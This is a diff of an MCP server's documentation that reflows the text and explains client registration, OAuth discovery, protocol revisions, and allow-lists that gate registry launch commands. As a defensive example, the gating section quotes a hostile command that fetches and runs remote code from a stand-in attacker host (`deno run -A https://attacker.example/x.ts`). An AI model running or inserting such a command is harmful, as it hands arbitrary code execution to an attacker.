@@ -32,8 +32,8 @@ until stdin closes.
 ### Registering with a client
 
 The scaffolder can do it for you: `zuke setup --mcp` (and `zuke import --mcp`)
-writes a project-scoped `.mcp.json` next to `zuke.ts` that registers this
-server as `zuke`, in the format Claude Code, Codex and most stdio clients read.
+writes a project-scoped `.mcp.json` next to `zuke.ts` that registers this server
+as `zuke`, in the format Claude Code, Codex and most stdio clients read.
 `--allow-run` registers it with execution enabled. An existing file is merged
 around its other servers.
 
@@ -555,16 +555,16 @@ expects the bare origin and must discard a document naming a path. That copy
 would have no correct consumer — a conformant client tries the path-inserted URL
 first and never asks for the root, and one that only asks for the root would
 throw away what it found. A resource declared as a bare origin publishes at the
-root, because for that identifier the root *is* the derived location.
+root, because for that identifier the root _is_ the derived location.
 
 Dynamic client registration is **not** required. The MCP specification asked for
 it in revision `2025-06-18`, demoted it to optional in `2025-11-25`, and marks
 it deprecated in the current `2026-07-28` — client id metadata documents and
 pre-registration are the sanctioned routes now. Verified against a real client:
-given a pre-registered client id it goes straight from discovery to
-`/authorize` and never touches a registration endpoint. So a provider that
-offers no registration — a GitHub OAuth App, for one — is usable: register the
-client once, out of band.
+given a pre-registered client id it goes straight from discovery to `/authorize`
+and never touches a registration endpoint. So a provider that offers no
+registration — a GitHub OAuth App, for one — is usable: register the client
+once, out of band.
 
 Verifying tokens is still not Zuke's job. Do not hand-roll it — import a
 maintained JOSE library in your build file (the build is ordinary code and may
@@ -649,24 +649,25 @@ tool in an already-running server with **no restart**:
   ordinary setup.
 - **A `command` location is gated the same way.** Its argv is not "code already
   on the machine" the way a local module path is: whoever wrote the entry chose
-  the program **and its arguments**, so `deno run -A https://attacker.example/x.ts`
-  is the refused remote-module case spelled as a command, and `sh -c …` is
-  arbitrary code with no fetch at all. A command location is therefore refused
-  unless its program appears in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated,
-  since a program path may contain a space; `*` allows any). The entry must match
-  `command[0]` **exactly**, case-folded — deliberately not by basename, because
-  the descriptor chooses the program string, so admitting `/tmp/anywhere/make`
+  the program **and its arguments**, so
+  `deno run -A https://attacker.example/x.ts` is the refused remote-module case
+  spelled as a command, and `sh -c …` is arbitrary code with no fetch at all. A
+  command location is therefore refused unless its program appears in
+  `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated, since a program path may
+  contain a space; `*` allows any). The entry must match `command[0]`
+  **exactly**, case-folded — deliberately not by basename, because the
+  descriptor chooses the program string, so admitting `/tmp/anywhere/make`
   because an operator wrote `make` would point a trusted name at a file of the
-  writer's own. A refusal names the exact string to add. Two consequences are the
-  operator's call: a **relative** program resolves against the descriptor's own
-  working directory, which the same writer chooses, so prefer an absolute path;
-  and listing a shell or interpreter hands over anything reachable locally,
-  since `sh -c` needs no fetch at all. Listing a program does **not** license it
-  to fetch, though: every argument naming a remote specifier still has to pass
-  `ZUKE_REGISTRY_LAUNCH_HOSTS`, so `deno run -A https://…` is refused by origin
-  exactly as the module form is. The refusal is
-  a structured `launch_command_not_allowed` error, audited as `denied`, before
-  the confirmation prompt, with nothing spawned. `zuke register` writes a module
+  writer's own. A refusal names the exact string to add. Two consequences are
+  the operator's call: a **relative** program resolves against the descriptor's
+  own working directory, which the same writer chooses, so prefer an absolute
+  path; and listing a shell or interpreter hands over anything reachable
+  locally, since `sh -c` needs no fetch at all. Listing a program does **not**
+  license it to fetch, though: every argument naming a remote specifier still
+  has to pass `ZUKE_REGISTRY_LAUNCH_HOSTS`, so `deno run -A https://…` is
+  refused by origin exactly as the module form is. The refusal is a structured
+  `launch_command_not_allowed` error, audited as `denied`, before the
+  confirmation prompt, with nothing spawned. `zuke register` writes a module
   location, so this only bites a hand-authored or second-party entry.
 - **Parameters.** A run tool exposes the registered build's declared parameters
   as its input schema — keyed by the parameter's property name (e.g. `skipE2e`),
@@ -740,17 +741,17 @@ tool argument is masked in the [audit log](#audit-log) too.
   `-32601 Method not found`; notifications never get a reply.
 - **Protocol revisions:** `2025-11-25` (the newest offered), `2025-06-18`,
   `2025-03-26` and `2024-11-05`. A client's requested version is echoed when
-  this server implements it, and otherwise answered with the newest — the
-  client then proceeds or disconnects. Over HTTP, a `MCP-Protocol-Version`
-  header naming a revision this server does not implement is refused `400` —
-  after authentication, so the list of supported revisions is not something an
+  this server implements it, and otherwise answered with the newest — the client
+  then proceeds or disconnects. Over HTTP, a `MCP-Protocol-Version` header
+  naming a revision this server does not implement is refused `400` — after
+  authentication, so the list of supported revisions is not something an
   unauthenticated caller can enumerate. An absent header is fine: the
-  specification says to assume `2025-03-26` then, and since nothing here
-  behaves differently across these revisions that assumption changes nothing.
-  A repeated header — a proxy re-adding one the client already sent — is
-  accepted when every copy agrees and names a supported revision; copies that
-  disagree are refused rather than resolved by picking one, since nothing here
-  could say which applies.
+  specification says to assume `2025-03-26` then, and since nothing here behaves
+  differently across these revisions that assumption changes nothing. A repeated
+  header — a proxy re-adding one the client already sent — is accepted when
+  every copy agrees and names a supported revision; copies that disagree are
+  refused rather than resolved by picking one, since nothing here could say
+  which applies.
 - **Why not `2026-07-28`:** it is not a newer version of this protocol so much
   as a different one. It removes `initialize` and `ping` entirely, requires a
   new `server/discover` RPC, carries the protocol version and client
@@ -758,16 +759,16 @@ tool argument is masked in the [audit log](#audit-log) too.
   `resultType` on every result and `ttlMs`/`cacheScope` on `tools/list`
   mandatory. Those are base-protocol requirements rather than capability-gated
   features, so a server cannot decline them and still claim the revision — the
-  specification's own compatibility matrix calls a server like this one
-  "legacy" and says a modern client talking to it simply fails. Supporting it
-  means a second request path serving both eras, which is a project rather than
-  a version-string edit. Until then, advertising it would be a claim this
-  server cannot honour.
+  specification's own compatibility matrix calls a server like this one "legacy"
+  and says a modern client talking to it simply fails. Supporting it means a
+  second request path serving both eras, which is a project rather than a
+  version-string edit. Until then, advertising it would be a claim this server
+  cannot honour.
 
   There is a side benefit to refusing the header rather than ignoring it. A
   client that speaks both eras probes with a modern request and falls back to
-  `initialize` when it gets a `4xx` it does not recognise, so the `400` is
-  what makes that fallback work. Without it, a modern request would have been
+  `initialize` when it gets a `4xx` it does not recognise, so the `400` is what
+  makes that fallback work. Without it, a modern request would have been
   answered under the older semantics — which is the specific confusion the
   specification warns about.
 - **Errors:** a bad _tool_ call (unknown tool, unknown target, a failed run) is
